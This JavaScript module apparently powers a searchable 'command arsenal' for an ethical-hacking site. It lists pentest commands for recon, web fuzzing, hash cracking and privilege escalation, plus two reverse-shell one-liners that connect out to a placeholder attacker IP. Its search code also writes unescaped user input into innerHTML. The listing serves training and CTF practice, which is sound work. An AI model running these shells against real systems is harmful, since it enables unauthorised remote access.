/**
 * ETC (Ethical Coders) - Interactive Command Arsenal Search Engine
 */

export const arsenalCommands = [
  { tool: 'Nmap Aggressive', cat: 'recon', desc: 'Scan target with OS detection, version discovery, and default NSE scripts.', cmd: 'nmap -A -T4 TARGET_IP' },
  { tool: 'Nmap All Ports', cat: 'recon', desc: 'Full TCP scan covering all 65,535 ports.', cmd: 'nmap -p- -T4 TARGET_IP' },
  { tool: 'Rustscan', cat: 'recon', desc: 'Ultra-fast port sweep piping open ports into Nmap.', cmd: 'rustscan -a TARGET_IP -- -A' },
  { tool: 'Gobuster Dir', cat: 'web', desc: 'Directory brute-force using common wordlist.', cmd: 'gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt' },
  { tool: 'Gobuster Extensions', cat: 'web', desc: 'Search for specific file types (php, txt, bak, html).', cmd: 'gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak' },
  { tool: 'Ffuf Parameter Fuzz', cat: 'web', desc: 'Discover hidden GET parameters on target URL.', cmd: 'ffuf -u "http://TARGET_IP/page?FUZZ=1" -w /usr/share/wordlists/dirb/common.txt' },
  { tool: 'Bash Reverse Shell', cat: 'shells', desc: 'Standard TCP interactive reverse shell one-liner.', cmd: 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' },
  { tool: 'Netcat Mkfifo Shell', cat: 'shells', desc: 'Named-pipe reverse shell when netcat -e is disabled.', cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f' },
  { tool: 'TTY Spawn & Upgrade', cat: 'shells', desc: 'Upgrade dumb shell to fully interactive pseudo-terminal.', cmd: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'' },
  { tool: 'Exiftool Metadata', cat: 'forensics', desc: 'Extract embedded EXIF, IPTC, and XMP metadata fields.', cmd: 'exiftool image.png' },
  { tool: 'Binwalk Carve', cat: 'forensics', desc: 'Detect and carve embedded files and compressed archives.', cmd: 'binwalk -e file.png' },
  { tool: 'Steghide Extract', cat: 'forensics', desc: 'Extract passphrase-protected steganographic payload.', cmd: 'steghide extract -sf image.jpg' },
  { tool: 'Hex Header Inspect', cat: 'forensics', desc: 'View magic byte signatures of suspect binary/image.', cmd: 'xxd file.jpg | head' },
  { tool: 'Hashcat NTLM/MD5', cat: 'cracking', desc: 'GPU-accelerated hash cracking using rockyou.txt wordlist.', cmd: 'hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt' },
  { tool: 'John the Ripper', cat: 'cracking', desc: 'CPU hash cracking engine.', cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt' },
  { tool: 'Sudo Privileges', cat: 'privesc', desc: 'List permitted sudo commands for current user (FIRST CHECK).', cmd: 'sudo -l' },
  { tool: 'Find SUID Binaries', cat: 'privesc', desc: 'Discover binaries with SUID bit set owned by root.', cmd: 'find / -perm -4000 -type f 2>/dev/null' },
  { tool: 'LinPEAS Auto Audit', cat: 'privesc', desc: 'Run automated Linux privilege escalation scanner.', cmd: './linpeas.sh | tee peas.txt' },
  { tool: 'Python HTTP Stager', cat: 'loot', desc: 'Stage tools on attack machine for target downloads.', cmd: 'python3 -m http.server 8000' }
];

export function initArsenal() {
  const searchInput = document.getElementById('arsenal-search-input');
  const gridContainer = document.getElementById('arsenal-grid-container');
  const toast = document.getElementById('toast-notification');

  if (!gridContainer) return;

  function showToast(message) {
    if (!toast) return;
    toast.textContent = message;
    toast.classList.add('is-visible');
    setTimeout(() => toast.classList.remove('is-visible'), 2200);
  }

  function renderCommands(filterQuery = '') {
    gridContainer.innerHTML = '';
    const q = filterQuery.toLowerCase().trim();

    const filtered = arsenalCommands.filter(c => 
      c.tool.toLowerCase().includes(q) ||
      c.cat.toLowerCase().includes(q) ||
      c.desc.toLowerCase().includes(q) ||
      c.cmd.toLowerCase().includes(q)
    );

    if (filtered.length === 0) {
      gridContainer.innerHTML = `<div style="grid-column: 1/-1; text-align: center; padding: 30px; color: var(--text-muted);">No commands matched "${filterQuery}".</div>`;
      return;
    }

    filtered.forEach(item => {
      const card = document.createElement('div');
      card.className = 'cmd-card';
      card.innerHTML = `
        <div class="cmd-info">
          <span class="cmd-tool-name">${item.tool}</span>
          <span class="cmd-category-tag">#${item.cat}</span>
        </div>
        <p class="cmd-description">${item.desc}</p>
        <div class="cmd-code-row">
          <code class="cmd-code-text">${item.cmd}</code>
          <button class="btn-copy-cmd" title="Copy Command">Copy</button>
        </div>
      `;

      const copyBtn = card.querySelector('.btn-copy-cmd');
      copyBtn.addEventListener('click', () => {
        navigator.clipboard.writeText(item.cmd).then(() => {
          copyBtn.textContent = 'Copied!';
          showToast(`Copied: ${item.tool}`);
          setTimeout(() => copyBtn.textContent = 'Copy', 1500);
        });
      });

      gridContainer.appendChild(card);
    });
  }

  if (searchInput) {
    searchInput.addEventListener('input', (e) => renderCommands(e.target.value));
  }

  renderCommands();
}
